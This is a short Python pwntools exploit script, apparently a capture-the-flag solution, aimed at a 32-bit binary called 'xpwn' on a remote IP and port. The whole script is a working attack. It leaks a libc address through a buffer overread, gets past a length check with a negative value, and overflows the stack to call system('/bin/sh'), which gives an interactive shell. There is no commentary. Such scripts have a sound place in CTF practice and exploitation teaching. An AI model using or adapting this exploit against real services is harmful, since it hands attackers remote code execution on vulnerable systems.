#!/usr/bin/env python
# coding=utf-8
from pwn import *
context.terminal=["tmux","splitw","-h"]
debug = 0
local = 0

if local:
    a=process("./xpwn")
    libc=ELF("/lib/i386-linux-gnu/libc.so.6")
else:
    a=remote("116.85.48.105","5005")
    libc=ELF("./libc.so.6")
if debug:
    gdb.attach(a,''' 
    b *0x8048722
    ''')
elf=ELF("./xpwn")

a.recv()
a.send("A"*0x30)
a.recvuntil("Hello ")
a.recvuntil("A"*0x30)
libc_base=u32(a.recv(4))-libc.symbols["_IO_2_1_stdout_"]
success("libc_base ==> 0x%x"%libc_base)
system_addr=libc_base+libc.symbols["system"]
#system_addr=libc_base+0x3ac62 #0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6
sh_addr=libc_base+next(libc.search("/bin/sh"))
a.recvuntil("password: ")
payload="-1\x00\x00"
'''
payload+=p32(system_addr)
payload+=p32(0x80484E0)
payload+=p32(sh_addr)
'''
a.send(payload)
a.recv()
payload=p32(system_addr)
payload+=p32(system_addr)
payload+=p32(sh_addr)
payload=payload.ljust(0x44,'\x00')
payload+='\x60'
a.send(payload)
a.interactive()

